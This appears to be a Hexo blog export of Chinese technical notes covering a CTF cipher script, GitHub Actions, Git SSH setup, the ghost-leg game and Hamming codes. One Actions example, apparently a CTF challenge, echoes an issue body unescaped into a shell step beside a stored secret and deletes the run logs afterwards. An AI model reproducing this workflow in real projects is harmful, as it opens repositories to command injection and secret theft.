class="built_in">str</span>:</span><br><span class="line">    start = flag.index(<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">    plain = flag[:start+<span class="number">1</span>]</span><br><span class="line">    flag = flag[start+<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        c = findalpha(i)</span><br><span class="line">        <span class="keyword">if</span> c:</span><br><span class="line">            plain += c</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plain += i</span><br><span class="line">    <span class="keyword">return</span> plain+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">plain2flag</span>(<span class="params">plain : <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    random.seed(plain.encode())</span><br><span class="line">    start = plain.index(<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">    flag = plain[:start+<span class="number">1</span>]</span><br><span class="line">    plain = <span class="built_in">str</span>.lower(plain[start+<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> plain:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> alpha:</span><br><span class="line">            idx = alpha.index(i)</span><br><span class="line">            k = random.randrange(<span class="number">0</span>, <span class="built_in">len</span>(table[idx]))</span><br><span class="line">            flag += table[idx][k]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += i</span><br><span class="line">    <span class="keyword">return</span> flag+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">s = plain2flag(<span class="string">&quot;flag&#123;This_is_flag&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">s = flag2plain(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>github action使用笔记</title>
    <url>//github-action-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>Github Action 是什么？是 Github 推出的持续集成工具。</p>
<p>持续集成是什么？简单说就是自动化的打包程序——如果是前端程序员，这样解释比较顺畅：</p>
<p>每次提交代码到 Github 的仓库后，Github 都会自动创建一个虚拟机（Mac /
Windows / Linux 任我们选），来执行一段或多段指令（由我们定），例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure>
<p>所以 Action 功能其实就是对项目代码进行自动化测试，从而保证 push
代码的正确性。利用 Action 功能，你可以选择 Github 提供的各种测试环境
(windows, Linux, MaxOS) 运行你的项目。</p>
<p>而我们集成 Github Action 的做法，就是在我们仓库的根目录下，创建一个
<code>.github</code> 文件夹，里面放一个 <code>*.yaml</code> 文件——这个
Yaml 文件就是我们配置 Github Action 所用的文件。</p>
<p><strong>Github Action 的使用限制</strong></p>
<ul>
<li>每个 Workflow 中的 job 最多可以执行 6 个小时</li>
<li>每个 Workflow 最多可以执行 72 小时</li>
<li>每个 Workflow 中的 job 最多可以排队 24 小时</li>
<li>在一个存储库的所有 Action 中，一个小时最多可以执行 1000 个 API
请求</li>
<li>并发工作数：Linux：20，Mac：5（专业版可以最多提高到 180 / 50）</li>
</ul>
<p>什么是 Workflow？Workflow 是由一个或多个 job
组成的可配置的自动化过程。我们通过创建 YAML 文件来创建 Workflow
配置。</p>
<h1 id="workflow-配置">Workflow 配置</h1>
<h2 id="名称">名称</h2>
<p>使用 <code>name</code> 参数定义 Workflow 的名称，Github 在存储库的
Action 页面上显示 Workflow 的名称。</p>
<p>如果我们省略 <code>name</code>，则 Github
会将其设置为相对于存储库根目录的工作流文件路径。</p>
<p>例如：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Greeting</span></span><br><span class="line"><span class="attr">on:</span> <span class="string">push</span></span><br></pre></td></tr></table></figure>
<h2 id="触发器">触发器</h2>
<p><code>on</code> 用来配置触发 Workflow 执行的 event
名称，比如：<strong>每当我提交代码到 Github 上的时候</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">//</span> <span class="string">单个事件</span></span><br><span class="line"><span class="attr">on:</span> <span class="string">push</span></span><br><span class="line"></span><br><span class="line"><span class="string">//</span> <span class="string">多个事件</span></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>,<span class="string">pull_request</span>]</span><br></pre></td></tr></table></figure>
<p>事件名称索引：<a href="https://docs.github.com/cn/actions/using-workflows/events-that-trigger-workflows">https://docs.github.com/cn/actions/using-workflows/events-that-trigger-workflows</a></p>
<h2 id="job">job</h2>
<p>首先要知道，一个 Workflow 由一个或多个 <code>job</code>
构成，含义是一次持续集成的运行，可以完成多个任务。</p>
<p>在 <code>jobs</code> 下定义的每一个 <code>id</code> 便与
<code>job</code> 一一对应，同时 <code>job</code> 的 <code>name</code>
属性用于显示在 Github 的 Action 页面中。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">my_first_job:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">My</span> <span class="string">first</span> <span class="string">job</span></span><br><span class="line">  <span class="attr">my_second_job:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">My</span> <span class="string">second</span> <span class="string">job</span></span><br></pre></td></tr></table></figure>
<p>上面的 <code>my_first_job</code> 和 <code>my_second_job</code> 就是
<code>job</code> 的 <code>id</code>。</p>
<p>而我们也可以定义 <code>job</code> 的依赖，通过 <code>needs</code>
属性配置。</p>
<p>所谓依赖，即如果依赖的 <code>job</code> 失败，则会跳过所有需要该
<code>job</code> 的 <code>job</code>。（类似执行的前置条件）</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">job1:</span></span><br><span class="line">  <span class="attr">job2:</span></span><br><span class="line">    <span class="attr">needs:</span> <span class="string">job1</span></span><br><span class="line">  <span class="attr">job3:</span></span><br><span class="line">    <span class="attr">needs:</span> [<span class="string">job1</span>, <span class="string">job2</span>]</span><br></pre></td></tr></table></figure>
<p><code>jobs</code> 的输出，用于和 <code>needs</code> 打配合：可以在
Action 页面中看到 <code>output</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">job1:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="comment"># Map a step output to a job output</span></span><br><span class="line">    <span class="attr">outputs:</span></span><br><span class="line">      <span class="attr">output1:</span> <span class="string">$&#123;&#123;</span> <span class="string">steps.step1.outputs.test</span> <span class="string">&#125;&#125;</span></span><br><span class="line">      <span class="attr">output2:</span> <span class="string">$&#123;&#123;</span> <span class="string">steps.step2.outputs.test</span> <span class="string">&#125;&#125;</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">step1</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">echo</span> <span class="string">&quot;::set-output name=test::hello&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">step2</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">echo</span> <span class="string">&quot;::set-output name=test::world&quot;</span></span><br><span class="line">  <span class="attr">job2:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">needs:</span> <span class="string">job1</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">echo</span> <span class="string">$&#123;&#123;needs.job1.outputs.output1&#125;&#125;</span> <span class="string">$&#123;&#123;needs.job1.outputs.output2&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>注意到上面的 <code>runs-on</code> 属性可以用于指定 <code>job</code>
的运行环境，而 Github 上可用的运行环境有以下：</p>
<figure>
<img src="/github-action-note/runs-on-support.png" alt="runs-on-support">
<figcaption aria-hidden="true">runs-on-support</figcaption>
</figure>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">job1:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">macos-10.15</span></span><br><span class="line">  <span class="attr">job2:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">windows-2019</span></span><br></pre></td></tr></table></figure>
<p>如果有必要的话，我们还可以定义常量（环境变量）</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">job1:</span></span><br><span class="line">    <span class="attr">env:</span></span><br><span class="line">      <span class="attr">HANDSOMEMAN:</span> <span class="string">qsdz</span></span><br></pre></td></tr></table></figure>
<p>我们还可以使用 if 条件语句来组织 <code>job</code> 运行。</p>
<p>每个 <code>job</code> 由多个 <code>step</code>
构成，它会从上至下依次执行。</p>
<p><strong>step 可以运行：</strong></p>
<ol type="1">
<li><strong>commands</strong>：命令行命令</li>
<li><strong>setup tasks</strong>：环境配置命令（比如安装个 Node
环境、安装个 Python 环境）</li>
<li><strong>action</strong>（in your repository, in public repository,
in Docker registry）：一段 Action</li>
</ol>
<p>每个 <code>step</code>
都在自己的运行器环境中运行，并且可以访问工作空间和文件系统。</p>
<p>因为每个 <code>step</code> 都在运行器环境中独立运行，所以
<code>step</code>
之间<strong>不会保留</strong>对<strong>环境变量</strong>的更改。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义 Workflow 的名字</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">Greeting</span></span><br><span class="line"><span class="comment"># 定义 Workflow 的触发器</span></span><br><span class="line"><span class="attr">on:</span> <span class="string">push</span></span><br><span class="line"><span class="comment"># 定义 Workflow 的 job</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="comment"># 定义 job 的 id</span></span><br><span class="line">  <span class="attr">my-job:</span></span><br><span class="line">    <span class="comment"># 定义 job 的 name</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">My</span> <span class="string">Job</span></span><br><span class="line">    <span class="comment"># 定义 job 的运行环境</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="comment"># 定义 job 的运行步骤</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="comment"># 定义 step 的名称</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Print</span> <span class="string">a</span> <span class="string">greeting</span></span><br><span class="line">      <span class="comment"># 定义 step 的环境变量</span></span><br><span class="line">      <span class="attr">env:</span></span><br><span class="line">        <span class="attr">GREET:</span> <span class="string">Hello!</span></span><br><span class="line">        <span class="attr">MSG:</span> <span class="string">World!</span></span><br><span class="line">      <span class="comment"># 运行指令：输出环境变量</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">echo</span> <span class="string">$GREET</span> <span class="string">$MSG</span></span><br></pre></td></tr></table></figure>
<p>而如果我们需要运行命令行命令，我们需要使用 <code>run</code> 参数</p>
<p><code>run</code> 命令在默认状态下会启动一个没有登录的 shell
来作为命令输入器。</p>
<p>每个 <code>run</code> 命令都会启动一个新的
shell，所以我们执行多行连续命令的时候需要写在同一个 <code>run</code>
下：</p>
<ul>
<li>单行命令</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">Dependencies</span></span><br><span class="line">  <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span></span><br></pre></td></tr></table></figure>
<ul>
<li>多行命令</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Clean</span> <span class="string">install</span> <span class="string">dependencies</span> <span class="string">and</span> <span class="string">build</span></span><br><span class="line">  <span class="string">run：</span> <span class="string">|</span></span><br><span class="line"><span class="string">    npm ci</span></span><br><span class="line"><span class="string">    npm run build</span></span><br></pre></td></tr></table></figure>
<p>使用 <code>working-directory</code> 关键字，我们可以指定 command
的运行位置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Clean</span> <span class="string">temp</span> <span class="string">directory</span></span><br><span class="line">  <span class="attr">run:</span> <span class="string">rm</span> <span class="string">-rf</span> <span class="string">*</span></span><br><span class="line">  <span class="attr">working-directory:</span> <span class="string">./temp</span></span><br></pre></td></tr></table></figure>
<p>使用 <code>shell</code> 关键字，来指定特定的 shell：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">steps:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Display</span> <span class="string">the</span> <span class="string">path</span></span><br><span class="line">    <span class="attr">run:</span> <span class="string">echo</span> <span class="string">$PATH</span></span><br><span class="line">    <span class="attr">shell:</span> <span class="string">bash</span></span><br></pre></td></tr></table></figure>
<p>下面是各个系统支持的 shell 类型：</p>
<figure>
<img src="/github-action-note/shell-support.png" alt="shell-support">
<figcaption aria-hidden="true">shell-support</figcaption>
</figure>
<p>就是有时候，我们的代码可能编译环境有多个。比如 electron
的程序，我们需要在 macos 上编译 dmg 压缩包，在 windows 上编译 exe
可执行文件。</p>
<p>这个时候，我们需要用到矩阵（<code>strategy</code>）这个功能。</p>
<p>比如下面的代码，我们使用了矩阵指定了：<strong>2 个操作系统，3 个 node
版本</strong>。</p>
<p>这时候下面这段代码就会执行 6 次（2 个操作系统 x 3 个 node
版本）。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">runs-on:</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.os</span> <span class="string">&#125;&#125;</span></span><br><span class="line"><span class="attr">strategy:</span></span><br><span class="line">  <span class="attr">matrix:</span></span><br><span class="line">    <span class="attr">os:</span> [<span class="string">ubuntu-16.04</span>, <span class="string">ubuntu-18.04</span>]</span><br><span class="line">    <span class="attr">node:</span> [<span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>]</span><br><span class="line"><span class="attr">steps:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">    <span class="attr">with:</span></span><br><span class="line">      <span class="attr">node-version:</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.node</span> <span class="string">&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="action">Action</h2>
<p>Action 其实就是命令，比如 Github 官方给了我们一些默认的命令：<a href="https://github.com/marketplace?type=actions&amp;query=actions">https://github.com/marketplace?type=actions&amp;query=actions</a></p>
<p>比如最常用的，check-out 代码到 Workflow 工作区：<a href="https://github.com/marketplace/actions/checkout">https://github.com/marketplace/actions/checkout</a></p>
<p>比如我们可以 check-out 仓库中最新的代码到 Workflow 的工作区：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">steps:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br></pre></td></tr></table></figure>
<p>当然，我们还可以给它添加个名字：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">steps:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Check</span> <span class="string">out</span> <span class="string">Git</span> <span class="string">repository</span></span><br><span class="line">    <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br></pre></td></tr></table></figure>
<p>也可以 Action 参数</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">steps:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v2-beta</span></span><br><span class="line">  <span class="attr">with:</span></span><br><span class="line">    <span class="attr">node-version:</span> <span class="string">&#x27;12&#x27;</span></span><br></pre></td></tr></table></figure>
<p>其中 <code>@v2</code> 和 <code>@v2-beta</code> 的意思都是 Action
的版本。</p>
<p>我们如果不带版本号的话，其实就是默认使用最新版本的了。</p>
<p>但是 <strong>Github
官方强烈要求我们带上版本号</strong>——这样子的话，我们就不会出现：<strong>写好一个
Workflow，但是由于某个 Action 的作者一更新，我们的 Workflow
就崩了的问题。</strong></p>
<p>而 <code>with</code> 中是一些特殊的 Action
所需要的参数，具体需要什么要在对应的 Action 官方页面中查看。</p>
<blockquote>
<p>有关更多请参考 <a href="https://docs.github.com/cn/actions/using-workflows/workflow-syntax-for-github-actions">https://docs.github.com/cn/actions/using-workflows/workflow-syntax-for-github-actions</a></p>
</blockquote>
<h1 id="实例">实例</h1>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Trigger</span> <span class="string">workflow</span> <span class="string">with</span> <span class="string">issue</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span> [<span class="string">issues</span>]</span><br><span class="line"><span class="attr">permissions:</span></span><br><span class="line">  <span class="attr">issues:</span> <span class="string">write</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">start:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">timeout-minutes:</span> <span class="number">2</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">echo</span> <span class="string">&quot;$<span class="template-variable">&#123;&#123; secrets.FLAG1 &#125;&#125;</span>&quot;</span> <span class="string">&gt;</span> <span class="string">flag</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">&#x27;echo &quot;$<span class="template-variable">&#123;&#123; github.event.issue.body &#125;&#125;</span>&quot; &gt; tmpfile&#x27;</span></span><br><span class="line">  <span class="attr">end:</span></span><br><span class="line">    <span class="attr">if:</span> <span class="string">$&#123;&#123;</span> <span class="string">always()</span> <span class="string">&#125;&#125;</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">echo</span> <span class="string">https://api.github.com/repos/$&#123;&#123;github.repository&#125;&#125;/issues/$&#123;&#123;github.event.issue.number&#125;&#125;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        curl \</span></span><br><span class="line"><span class="string">        -X PATCH \</span></span><br><span class="line"><span class="string">        -H &quot;Authorization: token $&#123;&#123; github.token &#125;&#125;&quot; \</span></span><br><span class="line"><span class="string">        -H &quot;Accept: application/vnd.github.v3+json&quot; \</span></span><br><span class="line"><span class="string">        https://api.github.com/repos/$&#123;&#123;github.repository&#125;&#125;/issues/$&#123;&#123;github.event.issue.number&#125;&#125; \</span></span><br><span class="line"><span class="string">        -d &#x27;&#123;&quot;title&quot;:&quot;This is new title&quot;, &quot;body&quot;: &quot;action run finished&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Clean</span> <span class="string">the</span> <span class="string">logs</span> <span class="string">of</span> <span class="string">the</span> <span class="string">run</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="comment"># Allows you to run this workflow manually from the Actions tab</span></span><br><span class="line">  <span class="attr">workflow_run:</span> </span><br><span class="line">    <span class="attr">workflows:</span> [<span class="string">Trigger</span> <span class="string">workflow</span> <span class="string">with</span> <span class="string">issue</span>]</span><br><span class="line">    <span class="attr">types:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">completed</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A workflow run is made up of one or more jobs that can run sequentially or in parallel</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="comment"># This workflow contains a single job called &quot;build&quot;</span></span><br><span class="line">  <span class="attr">clean:</span></span><br><span class="line">    <span class="comment"># The type of runner that the job will run on</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Steps represent a sequence of tasks that will be executed as part of the job</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="comment"># Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/github-script@v6</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">script:</span> <span class="string">|</span></span><br><span class="line"><span class="string">            github.rest.actions.deleteWorkflowRun(&#123;</span></span><br><span class="line"><span class="string">              owner: context.repo.owner,</span></span><br><span class="line"><span class="string">              repo: context.repo.repo,</span></span><br><span class="line"><span class="string">              run_id: context.payload.workflow_run.id</span></span><br><span class="line"><span class="string">            &#125;)</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>Git的使用笔记</title>
    <url>//git-note.html</url>
    <content><![CDATA[<h1 id="git的使用">Git的使用</h1>
<h2 id="git的user配置">Git的User配置</h2>
<p>打开 <strong>Git Bash </strong>(使用命令行也可以)</p>
<p>配置全局 <code>name</code></p>
<blockquote>
<p><strong>Github </strong>用户名</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name name</span><br></pre></td></tr></table></figure>
<p>配置全局 <code>email</code></p>
<blockquote>
<p><strong>Github</strong> 邮箱</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.email email</span><br></pre></td></tr></table></figure>
<p>以我的Github账户为例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name HasegawaAzusa</span><br><span class="line">git config --global user.email xxx@qq.com</span><br></pre></td></tr></table></figure>
<h2 id="使用ssh方式远程连接github">使用SSH方式远程连接Github</h2>
<p>打开<strong>Git Bash</strong>(使用命令行也可以)</p>
<p>先在本地生成对应邮箱的<strong>SSH RSA公钥密钥</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p>使用<strong>默认生成路径</strong>，<strong>默认空key</strong></p>
<p>前往 <code>~/.ssh</code>
目录下寻找密钥（其中默认<strong><code>id_rsa</code></strong>是密钥信息，<strong><code>id_rsa.pub</code></strong>为公钥信息）</p>
<p>在 <strong>Github</strong> 中新建 <strong>SSH keys (Github - Settings
- SSH and GPG keys - New SSH key)</strong></p>
<p><code>Title</code> 任意，<code>Key</code>
填入<strong>公钥信息</strong> (<code>id_rsa.pub</code> 文件内容)</p>
<figure>
<img src="/git-note/sshkeys.png" alt="sshkeys">
<figcaption aria-hidden="true">sshkeys</figcaption>
</figure>
<p>输入以下，验证是否连接成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh git@github.com</span><br></pre></td></tr></table></figure>
<p>成功结果如下</p>
<figure>
<img src="/git-note/success.png" alt="success">
<figcaption aria-hidden="true">success</figcaption>
</figure>
<blockquote>
<p><a href="/ssh-note.html#ssh-keygen">ssh-keygen参数详解</a></p>
<p><a href="ssh-note.html#ssh">ssh参数详解</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>鬼脚图笔记</title>
    <url>//guijiao-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>鬼脚图，又称画鬼脚，在日本称作阿弥陀签（あみだくじ），是一种游戏，也是一种简易决策方法，常被拿作抽签或者决定分配组合。</p>
<p>体现了决策中的唯一性、公平性、奇偶性。是一种简单的决策游戏，但因为在现实生活中有更为简单的决策游戏，即剪刀、石头、布相对于画鬼脚更为简单，所以一般不常见到。</p>
<h1 id="画法">画法</h1>
<p>在竖线的一端分别写上参与人，将需分配的事物或工作分成与人数的同等分后分别写在另一端。然后在每两个竖线相隔的区域，每个人任意的画上横线。每个人画横线的条数一般不限，但横线间不可交叉且横线不可横跨穿过两个间隔。</p>
<p>如下图中，A、B、C、D为参与人，1、2、3、4为要抽签的事物：</p>
<figure>
<img src="/guijiao-note/start.png" alt="start">
<figcaption aria-hidden="true">start</figcaption>
</figure>
<p>随后人们在竖线之间画上随机的横线，千万不可重合交叉：</p>
<figure>
<img src="/guijiao-note/process.png" alt="process">
<figcaption aria-hidden="true">process</figcaption>
</figure>
<h1 id="玩法">玩法</h1>
<p>每个人从自己的名字直走，遇到横线则拐弯。</p>
<p>以下以A为例子：</p>
<figure>
<img src="/guijiao-note/play.png" alt="play">
<figcaption aria-hidden="true">play</figcaption>
</figure>
<p>不难看出，实际上无论是从上面出发还是从下面出发，结果是不变的。</p>
]]></content>
      <tags>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>海明校验码的笔记</title>
    <url>//hamming-code-note.html</url>
    <content><![CDATA[<h1 id="海明校验码">海明校验码</h1>
<h2 id="简述">简述</h2>
<p>海明校验码由 Richard Hamming
提出，是一种多重（复式）的奇偶检错系统，用于检错和纠错。</p>
<p>海明校验是对偶校验的扩展，引入了更多的校验位来弥补奇偶校验的局限性。</p>
<h2 id="原理">原理</h2>
<p>假设有效信息有 <span class="math inline">\(k\)</span> 位，分成 <span class="math inline">\(r\)</span> 组，要组成 <span class="math inline">\(n\)</span>
位的海明校验码。每组设一个校验位，则需要 <span class="math inline">\(r\)</span> 个校验位，<span class="math inline">\(r\)</span> 个校验位组成一个 <span class="math inline">\(r\)</span> 位的指误字，可以表示 <span class="math inline">\(2^r\)</span> 种状态，如果指误字是全 0
则表示无误，因此有 <span class="math inline">\(2^r-1\)</span>
种状态表示错误，所以如果要海明校验码能发现并纠正一位的错误，则必须要满足下面的是关系式（香农第二定理）：
<span class="math display">\[
n=k+r\leq2^r-1
\]</span> 假设 <span class="math inline">\(k=8\)</span>，则代入公式得到： <span class="math display">\[
8+r\leq2^r-1
\]</span> 导出： <span class="math display">\[
r\geq4
\]</span> 故取 <span class="math inline">\(r=4\)</span></p>
<h2 id="校验码计算">校验码计算</h2>
<p>假设原始信息如下：</p>
<table>
<thead>
<tr class="header">
<th>位置</th>
<th>8</th>
<th>7</th>
<th>6</th>
<th>5</th>
<th>4</th>
<th>3</th>
<th>2</th>
<th>1</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>信息</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
</tbody>
</table>
<p>首先我们知道校验码位数为 4，确定校验码的位置在 1，2，4，8
上，得到新的信息如下：</p>
<table style="width:100%;">
<colgroup>
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
</colgroup>
<thead>
<tr class="header">
<th>位置</th>
<th>12</th>
<th>11</th>
<th>10</th>
<th>9</th>
<th>8</th>
<th>7</th>
<th>6</th>
<th>5</th>
<th>4</th>
<th>3</th>
<th>2</th>
<th>1</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>信息</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>H8</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>H4</td>
<td>0</td>
<td>H2</td>
<td>H1</td>
</tr>
</tbody>
</table>
<p>随后我们计算校验码的值，每一个校验码只计算其对应二进制位为 1
的位置，即：</p>
<table>
<thead>
<tr class="header">
<th>位置</th>
<th>二进制码</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>1</td>
<td>0001</td>
</tr>
<tr class="even">
<td>2</td>
<td>0010</td>
</tr>
<tr class="odd">
<td>3</td>
<td>0011</td>
</tr>
<tr class="even">
<td>4</td>
<td>0100</td>
</tr>
<tr class="odd">
<td>5</td>
<td>0101</td>
</tr>
<tr class="even">
<td>6</td>
<td>0110</td>
</tr>
<tr class="odd">
<td>7</td>
<td>0111</td>
</tr>
<tr class="even">
<td>8</td>
<td>1000</td>
</tr>
<tr class="odd">
<td>9</td>
<td>1001</td>
</tr>
<tr class="even">
<td>10</td>
<td>1010</td>
</tr>
<tr class="odd">
<td>11</td>
<td>1011</td>
</tr>
<tr class="even">
<td>12</td>
<td>1100</td>
</tr>
</tbody>
</table>
<p>那么海明码的计算为：</p>
<table>
<thead>
<tr class="header">
<th>海明码</th>
<th>出现的位置</th>
<th>对应位置上的值异或</th>
<th>结果</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>H1</td>
<td>3，5，7，9，11</td>
<td><span class="math inline">\(0\oplus1\oplus1\oplus0\oplus1\)</span></td>
<td>1</td>
</tr>
<tr class="even">
<td>H2</td>
<td>3，6，7，10，11</td>
<td><span class="math inline">\(0\oplus1\oplus1\oplus1\oplus1\)</span></td>
<td>0</td>
</tr>
<tr class="odd">
<td>H4</td>
<td>5，6，7，12</td>
<td><span class="math inline">\(1\oplus1\oplus1\oplus0\)</span></td>
<td>1</td>
</tr>
